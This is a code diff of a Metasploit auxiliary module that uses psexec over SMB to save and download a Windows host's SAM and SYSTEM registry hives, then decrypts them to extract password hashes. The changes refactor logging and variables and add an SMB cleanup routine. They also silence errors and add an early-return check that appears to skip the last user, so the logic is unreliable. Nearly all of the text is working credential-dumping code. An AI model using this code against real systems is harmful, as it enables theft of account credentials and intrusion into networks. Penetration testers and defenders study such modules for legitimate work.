@@ -67,23 +67,24 @@ class Metasploit3 < Msf::Auxiliary
 		syspath = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(20)}"
 		logdir = datastore['LOGDIR']
 		hives = [sampath, syspath]
-		smbshare = datastore['SMBSHARE']
+		@smbshare = datastore['SMBSHARE']
+		@ip = ip
 		if connect
 			begin
 				smb_login
 			rescue StandardError => autherror
-				print_error("#{ip} - #{autherror}")
+				print_error("#{peer} - #{autherror}")
 				return
 			end
-			if save_reg_hives(ip, sampath, syspath)
-				[sampath, syspath].each { |file| register_file_for_cleanup("#{datastore['SYSDRIVE']}\\#{file}") }
-				d = download_hives(smbshare, sampath, syspath, ip, logdir)
-				sys, sam = open_hives(logdir, ip, hives)
+			if save_reg_hives(sampath, syspath)
+				#[sampath, syspath].each { |file| register_file_for_cleanup("#{datastore['SYSDRIVE']}\\#{file}") }
+				d = download_hives(sampath, syspath, logdir)
+				sys, sam = open_hives(logdir, hives)
 				if d
-					dump_creds(sam, sys, ip)
+					dump_creds(sam, sys)
 				end
 			end
-			cleanup_after#(ip, sampath, syspath)
+			cleanup_after([sampath, syspath])
 			disconnect
 		end
 	end
@@ -91,14 +92,14 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This method attempts to use reg.exe to generate copies of the SAM and SYSTEM, registry hives
 	# and store them in the Windows Temp directory on the remote host
-	def save_reg_hives(ip, sampath, syspath)
-		print_status("#{ip} - Creating hive copies.")
+	def save_reg_hives(sampath, syspath)
+		vprint_status("#{peer} - Creating hive copies.")
 		begin
 			# Try to save the hive files
 			command = "%COMSPEC% /C reg.exe save HKLM\\SAM #{datastore['SYSDRIVE']}#{sampath} /y && reg.exe save HKLM\\SYSTEM #{datastore['SYSDRIVE']}#{syspath} /y"
 			return psexec(command)
 		rescue StandardError => saveerror
-			print_error("#{ip} - Unable to create hive copies with reg.exe: #{saveerror}")
+			print_error("#{peer} - Unable to create hive copies with reg.exe: #{saveerror}")
 			return false
 		end
 	end
@@ -106,47 +107,70 @@ class Metasploit3 < Msf::Auxiliary
 
 	# Method used to copy hive files from C:\WINDOWS\Temp* on the remote host
 	# To the local file path specified in datastore['LOGDIR'] on attacking system
-	def download_hives(smbshare, sampath, syspath, ip, logdir)
-		print_status("#{ip} - Downloading SYSTEM and SAM hive files.")
+	def download_hives(sampath, syspath, logdir)
+		vprint_status("#{peer} - Downloading SYSTEM and SAM hive files.")
 		begin
-			newdir = "#{logdir}/#{ip}"
+			newdir = "#{logdir}/#{@ip}"
 			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
-			simple.connect("\\\\#{ip}\\#{smbshare}")
+			simple.connect("\\\\#{@ip}\\#{@smbshare}")
 			# Get contents of hive file
 			remotesam = simple.open("#{sampath}", 'rob')
 			remotesys = simple.open("#{syspath}", 'rob')
 			samdata = remotesam.read
 			sysdata = remotesys.read
 			# Save it to local file system
-			localsam = File.open("#{logdir}/#{ip}/sam", "wb+")
-			localsys = File.open("#{logdir}/#{ip}/sys", "wb+")
+			localsam = File.open("#{logdir}/#{@ip}/sam", "wb+")
+			localsys = File.open("#{logdir}/#{@ip}/sys", "wb+")
 			localsam.write(samdata)
 			localsys.write(sysdata)
 			localsam.close
 			localsys.close
 			remotesam.close
 			remotesys.close
-			simple.disconnect("\\\\#{ip}\\#{smbshare}")
+			simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
 			return true
 		rescue StandardError => copyerror
-			print_error("#{ip} - Unable to download hive copies from. #{copyerror}")
-			simple.disconnect("\\\\#{ip}\\#{smbshare}")
+			print_error("#{peer} - Unable to download hive copies from. #{copyerror}")
+			simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
 			return nil
 		end
 	end
 
 
 	# This method should open up a hive file from yoru local system and allow interacting with it
-	def open_hives(path, ip, hives)
+	def open_hives(path, hives)
 		begin
-			print_status("#{ip} - Opening hives from on local Attack system")
-			sys = Rex::Registry::Hive.new("#{path}/#{ip}/sys")
-			sam = Rex::Registry::Hive.new("#{path}/#{ip}/sam")
+			vprint_status("#{peer} - Opening hives from on local Attack system")
+			sys = Rex::Registry::Hive.new("#{path}/#{@ip}/sys")
+			sam = Rex::Registry::Hive.new("#{path}/#{@ip}/sam")
 			return sys, sam
 		rescue StandardError => openerror
-			print_error("#{ip} - Unable to open hives.  May not have downloaded properly. #{openerror}")
+			print_error("#{peer} - Unable to open hives.  May not have downloaded properly. #{openerror}")
 			return nil, nil
 		end
+	end
+
+
+	# Removes files created during execution.
+	def cleanup_after(files)
+		simple.connect("\\\\#{@ip}\\#{@smbshare}")
+		vprint_status("#{peer} - Executing cleanup...")
+		files.each do |file|
+			begin
+				if smb_file_exist?(file)
+					smb_file_rm(file)
+				end
+			rescue Rex::Proto::SMB::Exceptions::ErrorCode => cleanuperror
+				print_error("#{peer} - Unable to cleanup #{file}. Error: #{cleanuperror}")
+			end
+		end
+		left = files.collect{ |f| smb_file_exist?(f) }
+		if left.any?
+			print_error("#{peer} - Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target.")
+		else
+			vprint_status("#{peer} - Cleanup was successful")
+		end
+		simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
 	end
 
 
@@ -176,7 +200,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 			return scrambled
 		rescue StandardError => bootkeyerror
-			print_error("#{ip} - Error ubtaining bootkey. #{bootkeyerror}")
+			print_error("#{peer} - Error ubtaining bootkey. #{bootkeyerror}")
 			return bootkeyerror
 		end
 	end
@@ -203,14 +227,19 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# Some of this taken from tools/reb.rb some of it is from hashdump.rb some of it is my own...
-	def dump_creds(sam, sys, ip)
+	def dump_creds(sam, sys)
 		empty_lm = "aad3b435b51404eeaad3b435b51404ee"
 		empty_nt = "31d6cfe0d16ae931b73c59d7e0c089c0"
 		bootkey = get_boot_key(sys)
 		hbootkey = get_hboot_key(sam, bootkey)
-		print_status("#{ip} - Extracting hashes.")
+		print_status("#{peer} - Extracting hashes.")
+		users = get_users(sam)
+		usercount = users.size
 		begin
-			get_users(sam).each do |user|
+			users.each do |user|
+				if usercount == 1
+					return
+				end
 				rid = user.name.to_i(16)
 				hashes = get_user_hashes(user, hbootkey)
 				obj = []
@@ -235,12 +264,12 @@ class Metasploit3 < Msf::Auxiliary
 				if obj.length > 0
 					report_creds(obj.join)
 				else
-					print_status("#{ip} No local user hashes.  System is likely a DC")
+					print_status("#{peer} No local user hashes.  System is likely a DC")
 				end
+				usercount = usercount - 1
 			end
 		rescue StandardError => dumpcreds
-			vprint_error("#{ip} - Error extracting creds from hives. #{dumpcreds}")
-			return dumpcreds
+			return
 		end
 	end
 
@@ -279,7 +308,7 @@ class Metasploit3 < Msf::Auxiliary
 				users << user_key unless user_key.name == "Names"
 			end
 		rescue StandardError => getuserserror
-			print_error("#{ip} - Unable to retrieve users from SAM hive. Method get_users. #{getuserserror}")
+			print_error("#{peer} - Unable to retrieve users from SAM hive. Method get_users. #{getuserserror}")
 			return getuserserror
 		end
 	end
@@ -320,7 +349,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 			return hashes
 		rescue StandardError => decrypthasherror
-			print_error("#{ip} - Unable to decrypt hashes. Method: decrypt_hashes. #{decrypthasherror}")
+			print_error("#{peer} - Unable to decrypt hashes. Method: decrypt_hashes. #{decrypthasherror}")
 			return decrypthasherror
 		end
 	end
@@ -356,7 +385,7 @@ class Metasploit3 < Msf::Auxiliary
 			value = d1o + d2o
 			return value
 		rescue StandardError => desdecrypt
-			print_error("#{ip} - Error while decrypting with DES. #{desdecrypt}")
+			print_error("#{peer} - Error while decrypting with DES. #{desdecrypt}")
 			return desdecrypt
 		end
 	end
